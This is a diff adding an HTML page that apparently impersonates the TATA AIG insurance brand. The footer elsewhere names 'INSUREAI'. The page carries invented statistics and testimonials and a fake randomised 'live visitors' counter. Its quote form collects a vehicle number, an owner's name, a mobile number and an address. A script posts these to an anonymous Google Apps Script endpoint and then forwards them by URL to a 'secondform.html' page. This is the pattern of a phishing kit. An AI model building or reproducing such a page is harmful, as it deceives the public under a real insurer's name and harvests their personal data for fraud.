@@ -1,0 +1,1696 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>InsureAI - Insurance Website</title>
+
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+
+<style>
+
+*{
+margin:0;
+padding:0;
+box-sizing:border-box;
+font-family:'Poppins',sans-serif;
+}
+
+body{
+background:#f4f7fb;
+overflow-x:hidden;
+}
+
+header{
+position:fixed;
+top:0;
+left:0;
+width:100%;
+background:white;
+padding:15px 80px;
+display:flex;
+justify-content:space-between;
+align-items:center;
+box-shadow:0 2px 15px rgba(0,0,0,.08);
+z-index:1000;
+}
+
+.logo{
+font-size:32px;
+font-weight:700;
+color:#003B8E;
+}
+
+.logo span{
+color:#E31837;
+}
+
+nav ul{
+display:flex;
+list-style:none;
+gap:30px;
+}
+
+nav ul li a{
+text-decoration:none;
+color:#222;
+font-weight:500;
+transition:.3s;
+}
+
+nav ul li a:hover{
+color:#003B8E;
+}
+
+.nav-btn{
+background:#E31837;
+padding:12px 25px;
+color:white;
+border:none;
+border-radius:8px;
+cursor:pointer;
+font-weight:600;
+}
+
+.hero{
+margin-top:90px;
+min-height:90vh;
+display:flex;
+align-items:center;
+justify-content:space-between;
+padding:0 80px;
+background:
+linear-gradient(
+135deg,
+#003B8E,
+#005BAC
+);
+color:white;
+}
+
+.hero-content{
+max-width:600px;
+}
+
+.hero-content h1{
+font-size:60px;
+line-height:1.1;
+margin-bottom:20px;
+}
+
+.hero-content p{
+font-size:18px;
+margin-bottom:30px;
+line-height:1.8;
+}
+
+.hero-buttons{
+display:flex;
+gap:15px;
+}
+
+.btn-primary{
+padding:15px 35px;
+background:#E31837;
+color:white;
+border:none;
+border-radius:10px;
+font-size:16px;
+font-weight:600;
+cursor:pointer;
+}
+
+.btn-secondary{
+padding:15px 35px;
+background:white;
+color:#003B8E;
+border:none;
+border-radius:10px;
+font-size:16px;
+font-weight:600;
+cursor:pointer;
+}
+
+.hero-image img{
+width:550px;
+max-width:100%;
+}
+
+.trust-bar{
+background:white;
+padding:40px 80px;
+display:grid;
+grid-template-columns:
+repeat(4,1fr);
+gap:25px;
+text-align:center;
+}
+
+.trust-card{
+padding:25px;
+border-radius:15px;
+background:#fff;
+box-shadow:
+0 5px 15px rgba(0,0,0,.08);
+}
+
+.trust-card h2{
+font-size:35px;
+color:#003B8E;
+margin-bottom:10px;
+}
+
+.trust-card p{
+font-size:15px;
+color:#666;
+}
+
+@media(max-width:900px){
+
+header{
+padding:15px 20px;
+}
+
+.hero{
+flex-direction:column;
+text-align:center;
+padding:50px 20px;
+}
+
+.hero-content h1{
+font-size:40px;
+}
+
+.trust-bar{
+grid-template-columns:1fr 1fr;
+padding:30px;
+}
+
+nav{
+display:none;
+}
+
+}
+
+
+
+</style>
+</head>
+
+<body>
+
+<header>
+
+<div class="logo">
+TATA <span>AIG</span>
+</div>
+
+<nav>
+<ul>
+<li><a href="#">Home</a></li>
+<li><a href="#">Car Insurance</a></li>
+<li><a href="#">Bike Insurance</a></li>
+<li><a href="#">Health Insurance</a></li>
+<li><a href="#">Claims</a></li>
+<li><a href="#">Support</a></li>
+</ul>
+</nav>
+
+<button class="nav-btn">
+Get Quote
+</button>
+
+</header>
+
+<section class="hero">
+
+<div class="hero-content">
+
+<h1>
+Protect What Matters Most
+</h1>
+
+<p>
+Get instant insurance quotes for cars,
+bikes, health and travel insurance.
+Fast claims, secure payments and
+24×7 customer support.
+</p>
+
+<div class="hero-buttons">
+
+<button class="btn-primary">
+Get Quote
+</button>
+
+<button class="btn-secondary">
+Renew Policy
+</button>
+
+</div>
+
+</div>
+
+<div class="hero-image">
+
+<img src="https://images.unsplash.com/photo-1503376780353-7e6692767b70?w=800" alt="Car">
+
+</div>
+
+</section>
+
+<section class="trust-bar">
+
+<div class="trust-card reveal">
+<h2>10M+</h2>
+<p>Happy Customers</p>
+</div>
+
+<div class="trust-card reveal">
+<h2>98%</h2>
+<p>Claim Settlement Ratio</p>
+</div>
+
+<div class="trust-card reveal">
+<h2>5000+</h2>
+<p>Network Garages</p>
+</div>
+
+<div class="trust-card reveal">
+<h2>24×7</h2>
+<p>Customer Support</p>
+</div>
+
+</section>
+
+<!-- INSURANCE PRODUCTS -->
+
+<section style="padding:80px 80px;">
+
+<h2 style="
+text-align:center;
+font-size:40px;
+color:#003B8E;
+margin-bottom:50px;
+">
+Our Insurance Products
+</h2>
+
+<div style="
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+gap:25px;
+">
+
+<div class="product-card reveal">
+<div class="icon">🚗</div>
+<h3>Car Insurance</h3>
+<p>
+Comprehensive coverage against accidents,
+theft and natural disasters.
+</p>
+<a href="#quoteForm" class="quote-btn">
+Get Quote
+</a>
+</div>
+
+<div class="product-card reveal">
+<div class="icon">🏍️</div>
+<h3>Bike Insurance</h3>
+<p>
+Affordable protection for two-wheelers
+with instant policy issuance.
+</p>
+<a href="#quoteForm" class="quote-btn">
+Get Quote
+</a>
+</div>
+
+<div class="product-card reveal">
+<div class="icon">❤️</div>
+<h3>Health Insurance</h3>
+<p>
+Cashless hospitalization and family
+health protection plans.
+</p>
+<button>Get Quote</button>
+</div>
+
+<div class="product-card reveal">
+<div class="icon">✈️</div>
+<h3>Travel Insurance</h3>
+<p>
+Travel securely with worldwide
+coverage and emergency assistance.
+</p>
+<button>Get Quote</button>
+</div>
+
+</div>
+
+</section>
+
+<style>
+
+.product-card{
+background:white;
+padding:30px;
+border-radius:20px;
+text-align:center;
+box-shadow:0 10px 20px rgba(0,0,0,.08);
+transition:.4s;
+}
+
+.product-card:hover{
+transform:translateY(-10px);
+}
+
+.product-card .icon{
+font-size:50px;
+margin-bottom:20px;
+}
+
+.product-card h3{
+margin-bottom:15px;
+color:#003B8E;
+}
+
+.product-card p{
+color:#666;
+line-height:1.7;
+margin-bottom:20px;
+}
+
+.product-card button{
+background:#E31837;
+color:white;
+border:none;
+padding:12px 25px;
+border-radius:8px;
+cursor:pointer;
+}
+
+.quote-card{
+max-width:1100px;
+margin:auto;
+background:white;
+border-radius:25px;
+overflow:hidden;
+box-shadow:0 15px 40px rgba(0,0,0,.08);
+}
+
+.top-features{
+display:grid;
+grid-template-columns:repeat(3,1fr);
+padding:35px;
+border-bottom:1px solid #eee;
+}
+
+.feature{
+text-align:center;
+}
+
+.feature h3{
+color:#003B8E;
+margin-bottom:8px;
+}
+
+.feature p{
+color:#777;
+}
+
+.quote-form{
+padding:40px;
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:25px;
+}
+
+.form-group{
+display:flex;
+flex-direction:column;
+}
+
+.form-group label{
+font-size:20px;
+font-weight:600;
+margin-bottom:10px;
+color:#003B8E;
+}
+
+.form-group input,
+.form-group textarea{
+width:100%;
+padding:18px;
+border:1px solid #ddd;
+border-radius:12px;
+font-size:16px;
+}
+
+.form-group small{
+margin-top:8px;
+color:#777;
+}
+
+.full-width{
+grid-column:1/3;
+}
+
+.quote-btn{
+grid-column:1/3;
+padding:22px;
+background:linear-gradient(90deg,#ff1744,#ff3d57);
+color:white;
+font-size:24px;
+font-weight:600;
+border:none;
+border-radius:14px;
+cursor:pointer;
+}
+
+.privacy{
+text-align:center;
+padding:20px;
+color:#666;
+border-top:1px solid #eee;
+}
+
+</style>
+
+<!-- WHY CHOOSE US -->
+
+<section style="
+background:#003B8E;
+padding:80px;
+color:white;
+">
+
+<h2 style="
+text-align:center;
+font-size:40px;
+margin-bottom:50px;
+">
+Why Choose Us?
+</h2>
+
+<div style="
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+gap:25px;
+">
+
+<div class="feature-box reveal">
+<h3>⚡ Fast Claims</h3>
+<p>Quick and hassle-free claim processing.</p>
+</div>
+
+<div class="feature-box reveal">
+<h3>🛡 Secure Coverage</h3>
+<p>Protection against multiple risks.</p>
+</div>
+
+<div class="feature-box reveal">
+<h3>💳 Easy Payments</h3>
+<p>Instant online payment facilities.</p>
+</div>
+
+<div class="feature-box reveal">
+<h3>📞 24×7 Support</h3>
+<p>Dedicated customer support anytime.</p>
+</div>
+
+</div>
+
+</section>
+
+<style>
+
+.feature-box{
+background:rgba(255,255,255,.1);
+padding:25px;
+border-radius:15px;
+backdrop-filter:blur(10px);
+}
+
+.feature-box h3{
+margin-bottom:15px;
+}
+
+</style>
+
+<!-- ADVANCED QUOTE FORM -->
+
+<section style="
+padding:80px;
+background:#f4f7fb;
+">
+
+<h2 style="
+text-align:center;
+font-size:40px;
+margin-bottom:50px;
+color:#003B8E;
+">
+
+<section id="quoteForm">
+Get Your Insurance Quote
+</h2>
+
+<p style="
+text-align:center;
+font-size:20px;
+color:#6b7a99;
+margin-bottom:40px;
+">
+Fill in your details below and get an instant insurance quote.
+</p>
+
+<div class="quote-card">
+
+<div class="top-features">
+
+<div class="feature">
+<h3>🛡️ 100% Secure</h3>
+<p>Your data is protected</p>
+</div>
+
+<div class="feature">
+<h3>⚡ Instant Quote</h3>
+<p>Get result in seconds</p>
+</div>
+
+<div class="feature">
+<h3>💰 Best Price</h3>
+<p>Compare & Save More</p>
+</div>
+
+</div>
+
+<form class="quote-form">
+
+<div class="form-group">
+<label>🚗 Vehicle Number</label>
+<input
+id="vehicleNo"
+oninput="this.value=this.value.toUpperCase()">
+<small>Enter your vehicle registration number</small>
+</div>
+
+<div class="form-group">
+<label>₹ Vehicle Price</label>
+<input type="number" id="vehiclePrice" placeholder="Enter Vehicle Price">
+<small>Ex-showroom price of your vehicle</small>
+</div>
+
+<div class="form-group">
+<label>👤 Owner Name</label>
+<input
+id="ownerName"
+oninput="this.value=this.value.toUpperCase()">
+<small>Enter name as per documents</small>
+</div>
+
+<div class="form-group">
+<label>📞 Mobile Number</label>
+<input
+id="mobile"
+maxlength="10"
+oninput="validateMobile(this)">
+<small>We will send quote on this number</small>
+</div>
+
+<div class="form-group full-width">
+<label>📍 Address</label>
+<input
+id="address"
+oninput="this.value=this.value.toUpperCase()">
+<small>Enter your complete address</small>
+</div>
+
+<button
+type="button"
+class="quote-btn"
+onclick="openSecondForm()">
+📄 Generate Quote →
+</button>
+
+</form>
+
+<div class="privacy">
+🔒 We respect your privacy. Your information is safe with us.
+</div>
+
+</div>
+
+</section>
+</section>
+
+<script>
+
+    async function saveToSheet(data){
+        console.log("Saving Data :", data);
+
+await fetch(
+"https://script.google.com/macros/s/AKfycbwH7ZC3eFeV4B-3Z8B9-LihYgrHqAYEdlx2DFdeWE-i5Wq3XqmrHIlWheoOQKTXtuFpIA/exec",
+{
+method:"POST",
+body:JSON.stringify(data)
+}
+);
+
+}
+
+async function openSecondForm(){
+
+let vehicleNo =
+document.getElementById("vehicleNo").value.trim();
+
+let vehiclePrice =
+document.getElementById("vehiclePrice").value.trim();
+
+let ownerName =
+document.getElementById("ownerName").value.trim();
+
+let mobile =
+document.getElementById("mobile").value.trim();
+
+let address =
+document.getElementById("address").value.trim();
+
+if(vehicleNo===""){
+alert("Please enter Vehicle Number");
+return;
+}
+
+if(vehiclePrice===""){
+alert("Please enter Vehicle Price");
+return;
+}
+
+if(ownerName===""){
+alert("Please enter Owner Name");
+return;
+}
+
+if(address===""){
+alert("Please enter Address");
+return;
+}
+
+if(!/^[6-9]\d{9}$/.test(mobile)){
+alert("Please enter valid 10 digit mobile number");
+return;
+}
+
+let sessionId =
+Date.now().toString() +
+Math.floor(Math.random()*10000);
+
+localStorage.setItem(
+"sessionId",
+sessionId
+);
+
+await saveToSheet({
+
+sessionId:sessionId,
+
+vehicleNo:vehicleNo,
+
+vehiclePrice:vehiclePrice,
+
+ownerName:ownerName,
+
+mobile:mobile,
+
+address:address,
+
+status:"FORM1"
+
+});
+
+window.location.href =
+"secondform.html?" +
+"vehicleNo=" + encodeURIComponent(vehicleNo) +
+"&vehiclePrice=" + encodeURIComponent(vehiclePrice) +
+"&ownerName=" + encodeURIComponent(ownerName) +
+"&mobile=" + encodeURIComponent(mobile) +
+"&address=" + encodeURIComponent(address);
+
+}
+
+</script>
+
+<!-- ACHIEVEMENTS SECTION -->
+
+<section style="
+padding:80px;
+background:white;
+">
+
+<h2 style="
+text-align:center;
+font-size:40px;
+color:#003B8E;
+margin-bottom:60px;
+">
+Our Achievements
+</h2>
+
+<div style="
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(250px,1fr));
+gap:25px;
+">
+
+<div class="achievement-card reveal">
+<h1 class="counter" data-target="10000000">0</h1>
+<p>Happy Customers</p>
+</div>
+
+<div class="achievement-card reveal">
+<h1 class="counter" data-target="5000">0</h1>
+<p>Network Garages</p>
+</div>
+
+<div class="achievement-card reveal">
+<h1 class="counter" data-target="98">0</h1>
+<p>Claim Settlement %</p>
+</div>
+
+<div class="achievement-card reveal">
+<h1 class="counter" data-target="24">0</h1>
+<p>Support Hours</p>
+</div>
+
+</div>
+
+</section>
+
+<style>
+
+.achievement-card{
+background:#f4f7fb;
+padding:35px;
+border-radius:20px;
+text-align:center;
+box-shadow:0 10px 20px rgba(0,0,0,.08);
+}
+
+.achievement-card h1{
+font-size:50px;
+color:#E31837;
+margin-bottom:15px;
+}
+
+.achievement-card p{
+font-size:18px;
+color:#555;
+}
+
+</style>
+
+<!-- TESTIMONIALS -->
+
+<section style="
+padding:80px;
+background:#003B8E;
+color:white;
+">
+
+<h2 style="
+text-align:center;
+font-size:40px;
+margin-bottom:50px;
+">
+What Our Customers Say
+</h2>
+
+<div style="
+display:grid;
+grid-template-columns:repeat(auto-fit,minmax(300px,1fr));
+gap:25px;
+">
+
+<div class="review-card reveal">
+⭐⭐⭐⭐⭐
+<h3>Rahul Sharma</h3>
+<p>
+Very smooth insurance process.
+Claim settled within few days.
+</p>
+</div>
+
+<div class="review-card reveal">
+⭐⭐⭐⭐⭐
+<h3>Aman Kumar</h3>
+<p>
+Excellent support and easy
+online renewal process.
+</p>
+</div>
+
+<div class="review-card reveal">
+⭐⭐⭐⭐⭐
+<h3>Priya Singh</h3>
+<p>
+Affordable premium and
+excellent customer service.
+</p>
+</div>
+
+</div>
+
+</section>
+
+<style>
+
+.review-card{
+background:rgba(255,255,255,.12);
+padding:30px;
+border-radius:15px;
+backdrop-filter:blur(10px);
+}
+
+.review-card h3{
+margin-top:15px;
+margin-bottom:15px;
+}
+
+</style>
+
+<!-- FAQ SECTION -->
+
+<section style="
+padding:80px;
+background:#f4f7fb;
+">
+
+<h2 style="
+text-align:center;
+font-size:40px;
+color:#003B8E;
+margin-bottom:50px;
+">
+Frequently Asked Questions
+</h2>
+
+<div style="
+max-width:900px;
+margin:auto;
+">
+
+<button class="faq-btn">
+How can I renew my policy?
+</button>
+
+<div class="faq-content">
+<p>
+You can renew your policy online
+within a few minutes using our portal.
+</p>
+</div>
+
+<button class="faq-btn">
+How do I file a claim?
+</button>
+
+<div class="faq-content">
+<p>
+Submit your claim online and our
+team will contact you immediately.
+</p>
+</div>
+
+<button class="faq-btn">
+What documents are required?
+</button>
+
+<div class="faq-content">
+<p>
+Vehicle RC, Driving License and
+previous policy details.
+</p>
+</div>
+
+<button class="faq-btn">
+How long does claim settlement take?
+</button>
+
+<div class="faq-content">
+<p>
+Usually between 24 hours and 7 days
+depending on the claim type.
+</p>
+</div>
+
+</div>
+
+</section>
+
+<style>
+
+.faq-btn{
+width:100%;
+padding:20px;
+border:none;
+background:white;
+text-align:left;
+font-size:18px;
+margin-top:10px;
+cursor:pointer;
+border-radius:10px;
+box-shadow:0 5px 15px rgba(0,0,0,.08);
+}
+
+.faq-content{
+display:none;
+padding:20px;
+background:white;
+margin-bottom:10px;
+border-radius:10px;
+}
+
+</style>
+
+<!-- WHATSAPP BUTTON -->
+
+<a href="https://wa.me/919999999999"
+target="_blank"
+class="whatsapp-btn">
+💬
+</a>
+
+<style>
+
+.whatsapp-btn{
+position:fixed;
+bottom:30px;
+right:30px;
+width:65px;
+height:65px;
+background:#25D366;
+border-radius:50%;
+display:flex;
+justify-content:center;
+align-items:center;
+font-size:30px;
+text-decoration:none;
+z-index:9999;
+box-shadow:0 5px 15px rgba(0,0,0,.3);
+}
+
+</style>
+
+<script>
+
+/* FAQ */
+
+const faqBtns =
+document.querySelectorAll(".faq-btn");
+
+faqBtns.forEach(btn=>{
+
+btn.addEventListener("click",()=>{
+
+const content =
+btn.nextElementSibling;
+
+if(content.style.display==="block"){
+content.style.display="none";
+}
+else{
+content.style.display="block";
+}
+
+});
+
+});
+
+/* COUNTER */
+
+const counters =
+document.querySelectorAll(".counter");
+
+counters.forEach(counter=>{
+
+const updateCounter=()=>{
+
+const target=
++counter.getAttribute("data-target");
+
+const count=
++counter.innerText;
+
+const increment=
+target/100;
+
+if(count<target){
+
+counter.innerText=
+Math.ceil(count+increment);
+
+setTimeout(updateCounter,20);
+
+}else{
+
+counter.innerText=target;
+
+}
+
+}
+
+updateCounter();
+
+});
+
+</script>
+
+<!-- CONTACT SECTION -->
+
+<section style="
+padding:80px;
+background:white;
+">
+
+<h2 style="
+text-align:center;
+font-size:40px;
+color:#003B8E;
+margin-bottom:50px;
+">
+Contact Us
+</h2>
+
+<div style="
+display:grid;
+grid-template-columns:1fr 1fr;
+gap:40px;
+max-width:1200px;
+margin:auto;
+">
+
+<div class="contact-info">
+
+<h3>Get In Touch</h3>
+
+<p>
+📍 Patna, Bihar, India
+</p>
+
+<p>
+📞 +91 9876543210
+</p>
+
+<p>
+✉ support@insureai.com
+</p>
+
+<p>
+🕒 Mon - Sun : 24×7 Support
+</p>
+
+</div>
+
+<div class="contact-form">
+
+<input type="text"
+placeholder="Your Name">
+
+<input type="email"
+placeholder="Your Email">
+
+<input type="tel"
+placeholder="Mobile Number">
+
+<textarea
+rows="5"
+placeholder="Your Message">
+</textarea>
+
+<button class="contact-btn">
+Send Message
+</button>
+
+</div>
+
+</div>
+
+</section>
+
+<style>
+
+.contact-info{
+padding:30px;
+background:#f4f7fb;
+border-radius:20px;
+}
+
+.contact-info h3{
+margin-bottom:25px;
+color:#003B8E;
+}
+
+.contact-info p{
+margin-bottom:15px;
+font-size:17px;
+}
+
+.contact-form{
+display:flex;
+flex-direction:column;
+gap:15px;
+}
+
+.contact-form input,
+.contact-form textarea{
+padding:15px;
+border:1px solid #ddd;
+border-radius:10px;
+font-size:16px;
+}
+
+.contact-btn{
+background:#E31837;
+color:white;
+border:none;
+padding:15px;
+border-radius:10px;
+cursor:pointer;
+font-size:18px;
+}
+
+@media(max-width:900px){
+
+.contact-form,
+.contact-info{
+width:100%;
+}
+
+}
+
+</style>
+
+<!-- NEWSLETTER -->
+
+<section style="
+padding:70px;
+background:#003B8E;
+color:white;
+text-align:center;
+">
+
+<h2 style="
+font-size:40px;
+margin-bottom:20px;
+">
+Stay Updated
+</h2>
+
+<p style="
+margin-bottom:30px;
+font-size:18px;
+">
+Subscribe to get latest offers and updates
+</p>
+
+<div style="
+display:flex;
+justify-content:center;
+gap:15px;
+flex-wrap:wrap;
+">
+
+<input
+type="email"
+placeholder="Enter Email Address"
+style="
+padding:15px;
+width:350px;
+border:none;
+border-radius:10px;
+">
+
+<button
+style="
+padding:15px 30px;
+background:#E31837;
+border:none;
+color:white;
+border-radius:10px;
+cursor:pointer;
+font-size:16px;
+">
+Subscribe
+</button>
+
+</div>
+
+</section>
+
+<!-- FOOTER -->
+
+<footer style="
+background:#001F4D;
+color:white;
+padding:70px 50px 30px;
+">
+
+<div style="
+display:grid;
+grid-template-columns:
+repeat(auto-fit,minmax(250px,1fr));
+gap:40px;
+">
+
+<div>
+
+<h2>
+INSURE<span style="color:#E31837;">AI</span>
+</h2>
+
+<p style="
+margin-top:20px;
+line-height:1.8;
+">
+Protecting millions of customers
+with trusted insurance solutions.
+</p>
+
+</div>
+
+<div>
+
+<h3>Quick Links</h3>
+
+<p>Home</p>
+<p>Car Insurance</p>
+<p>Bike Insurance</p>
+<p>Health Insurance</p>
+<p>Claims</p>
+
+</div>
+
+<div>
+
+<h3>Support</h3>
+
+<p>Help Center</p>
+<p>Contact Us</p>
+<p>FAQs</p>
+<p>Privacy Policy</p>
+<p>Terms & Conditions</p>
+
+</div>
+
+<div>
+
+<h3>Follow Us</h3>
+
+<p>📘 Facebook</p>
+<p>📸 Instagram</p>
+<p>🐦 Twitter</p>
+<p>💼 LinkedIn</p>
+
+</div>
+
+</div>
+
+<hr style="
+margin:40px 0;
+border-color:rgba(255,255,255,.2);
+">
+
+<p style="
+text-align:center;
+">
+© 2026 INSUREAI. All Rights Reserved.
+</p>
+
+</footer>
+
+<!-- SCROLL TO TOP -->
+
+<button id="topBtn">
+↑
+</button>
+
+<style>
+
+#topBtn{
+
+position:fixed;
+bottom:110px;
+right:30px;
+
+width:55px;
+height:55px;
+
+border:none;
+border-radius:50%;
+
+background:#003B8E;
+color:white;
+
+font-size:25px;
+cursor:pointer;
+
+display:none;
+
+z-index:9999;
+
+box-shadow:
+0 5px 15px rgba(0,0,0,.3);
+
+}
+
+</style>
+
+<script>
+
+let topBtn =
+document.getElementById("topBtn");
+
+window.onscroll=function(){
+
+if(document.body.scrollTop>300 ||
+document.documentElement.scrollTop>300){
+
+topBtn.style.display="block";
+
+}else{
+
+topBtn.style.display="none";
+
+}
+
+}
+
+topBtn.onclick=function(){
+
+window.scrollTo({
+
+top:0,
+behavior:"smooth"
+
+});
+
+}
+
+</script>
+
+<!-- LOADING SCREEN -->
+
+<div id="loader">
+
+<div class="spinner"></div>
+
+<h2>Loading TATA AIG...</h2>
+
+</div>
+
+<style>
+
+#loader{
+
+position:fixed;
+top:0;
+left:0;
+
+width:100%;
+height:100vh;
+
+background:white;
+
+display:flex;
+flex-direction:column;
+
+justify-content:center;
+align-items:center;
+
+z-index:999999;
+
+}
+
+.spinner{
+
+width:70px;
+height:70px;
+
+border:8px solid #ddd;
+border-top:8px solid #003B8E;
+
+border-radius:50%;
+
+animation:spin 1s linear infinite;
+
+margin-bottom:20px;
+
+}
+
+@keyframes spin{
+
+100%{
+transform:rotate(360deg);
+}
+
+}
+
+</style>
+
+<!-- LIVE VISITOR COUNTER -->
+
+<div id="visitorBox">
+
+👥 Live Visitors:
+<span id="visitors">125</span>
+
+</div>
+
+<style>
+
+#visitorBox{
+
+position:fixed;
+
+left:20px;
+bottom:20px;
+
+background:white;
+
+padding:12px 18px;
+
+border-radius:10px;
+
+box-shadow:
+0 5px 15px rgba(0,0,0,.15);
+
+font-weight:600;
+
+z-index:9999;
+
+}
+
+</style>
+
+<!-- REVEAL ANIMATION -->
+
+<style>
+
+.reveal{
+
+opacity:0;
+transform:translateY(50px);
+
+transition:all 1s ease;
+
+}
+
+.reveal.active{
+
+opacity:1;
+transform:translateY(0);
+
+}
+
+</style>
+
+<script>
+
+/* LOADER */
+
+window.addEventListener("load",()=>{
+
+setTimeout(()=>{
+
+document.getElementById("loader")
+.style.display="none";
+
+},1500);
+
+});
+
+
+/* LIVE VISITORS */
+
+let visitorCount=
+document.getElementById("visitors");
+
+setInterval(()=>{
+
+let value=
+Math.floor(
+Math.random()*50
+)+100;
+
+visitorCount.innerHTML=value;
+
+},4000);
+
+
+/* REVEAL EFFECT */
+
+function reveal(){
+
+let reveals=
+document.querySelectorAll(
+".achievement-card,.review-card,.product-card,.feature-box,.trust-card"
+);
+
+for(let i=0;i<reveals.length;i++){
+
+let windowHeight=
+window.innerHeight;
+
+let elementTop=
+reveals[i]
+.getBoundingClientRect().top;
+
+let revealPoint=
+100;
+
+if(
+elementTop <
+windowHeight - revealPoint
+){
+
+reveals[i]
+.classList.add("active");
+
+}
+
+}
+
+}
+
+window.addEventListener(
+"scroll",
+reveal
+);
+
+reveal();
+
+
+/* STICKY NAVBAR EFFECT */
+
+window.addEventListener(
+"scroll",
+function(){
+
+let header=
+document.querySelector("header");
+
+if(window.scrollY>100){
+
+header.style.background=
+"#ffffff";
+
+header.style.boxShadow=
+"0 5px 20px rgba(0,0,0,.15)";
+
+}else{
+
+header.style.background=
+"#ffffff";
+
+}
+
+}
+);
+
+
+
+
+function validateMobile(input){
+
+let value = input.value.replace(/\D/g,'');
+
+if(value.startsWith("0")){
+value = value.substring(1);
+}
+
+input.value = value.substring(0,10);
+
+}
+
+</script>
+
+<!-- EXTRA PREMIUM HOVER EFFECT -->
+
+<style>
+
+.product-card:hover,
+.feature-box:hover,
+.review-card:hover,
+.achievement-card:hover{
+
+transform:
+translateY(-12px)
+scale(1.02);
+
+transition:.4s;
+
+}
+
+.contact-btn:hover,
+.nav-btn:hover,
+.btn-primary:hover{
+
+opacity:.9;
+
+transform:
+translateY(-3px);
+
+transition:.3s;
+
+}
+
+.trust-card:hover{
+
+transform:
+translateY(-10px);
+
+transition:.4s;
+
+}
+
+</style>
+
+<!-- FINAL COPYRIGHT BAR -->
+
+<div style="
+background:#000;
+color:white;
+text-align:center;
+padding:15px;
+font-size:14px;
+">
+
+Designed & Developed by
+INSUREAI TEAM
+
+</div>
+
+</body>
+</html>
